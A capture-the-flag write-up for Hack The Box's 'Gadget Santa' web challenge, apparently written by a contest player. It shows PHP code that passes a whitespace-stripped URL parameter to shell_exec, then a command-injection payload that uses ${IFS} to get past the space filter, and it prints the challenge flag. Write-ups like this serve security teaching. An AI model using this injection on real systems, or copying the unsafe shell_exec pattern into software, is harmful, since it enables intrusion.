# Cyber Santa is Coming to Town: Gadget Santa

![Author: crxzii](https://img.shields.io/badge/Author-crxzii-blue.svg) ![Contest Date: 05.12.2021](https://img.shields.io/badge/Contest%20Date-05.12.2021-lightgrey.svg)

![Solve Moment: During The Contest](https://img.shields.io/badge/Solve%20Moment-During%20The%20Contest-brightgreen.svg) ![Category: Web](https://img.shields.io/badge/Category-Web-lightgrey.svg) ![Score: 300](https://img.shields.io/badge/Score-300-brightgreen.svg)

## Description

> It seems that the evil elves have broken the controller gadget for the good old candy cane factory! Can you team up with the real red teamer Santa to hack back?

## Attached Files

- web_gadget_santa.zip

A Zip file containing the full docker source code.

## Summary

We use a vulnerability in the way commands are handled to execute custom commands we pass. <br>
Using that we can read the flag, we get from an endpoint of an http server.

## Flag

```
HTB{54nt4_i5_th3_r34l_r3d_t34m3r}
```

## Detailed Solution

Upon opening the Website we are greeted with a Monitor with some options we can click.

![Monitor Image](https://i.gyazo.com/5ae21ebff65c92c16c95c93b62e4245d.png)

Clicking on one of the buttons gives us an output and shows us the url, where we can see the command being passed.

![Image of Command](https://i.gyazo.com/132e0d418341e20989ed613a84439920.png)

Taking a look at the source Code, we can see the how the commands are parsed:

```js
public function index($router){
    $command = isset($_GET['command']) ? $_GET['command'] : 'welcome';
    $monitor = new MonitorModel($command);
    return $router->view('index', ['output' => $monitor->getOutput()]);
}
```

```js
class MonitorModel
{
    public function __construct($command)
    {
        $this->command = $this->sanitize($command);
    }

    public function sanitize($command)
    {
        $command = preg_replace('/\s+/', '', $command);
        return $command;
    }

    public function getOutput()
    {
        return shell_exec('/santa_mon.sh '.$this->command);
    }
}
```

The script takes the command, sanitizes it, which removes any space characters and passes it on to a shell script.<br>
Taking a look at the shell script, doesn't give us any hints. But we can also find a python script called `ups_manager.py`, which hosts a http server on port 3000. And here we find an interesting endpoint:

```py
elif self.path == '/get_flag':
  resp_ok()
  self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))
  return
```

This means we need to access `localhost:3000/get_flag` to receive the flag.<br>
Now it's time to exploit the `shell_exec` used in the MonitorModel. We craft a simple URL, which should print us the flag:

```
/?command=ups_status;curl localhost:3000/get_flag
```

There is only one problem. We can't use space characters, as the sanitization removes those.<br>
We can bypass this by using `${IFS}`, which is a linux shell variable for the space character. And it works!

![Image of payload executed](https://i.gyazo.com/8adea60a0cf5070cfd7a4e999baa3674.png)

This way we can just read our flag from the monitor screen `HTB{54nt4_i5_th3_r34l_r3d_t34m3r}`!
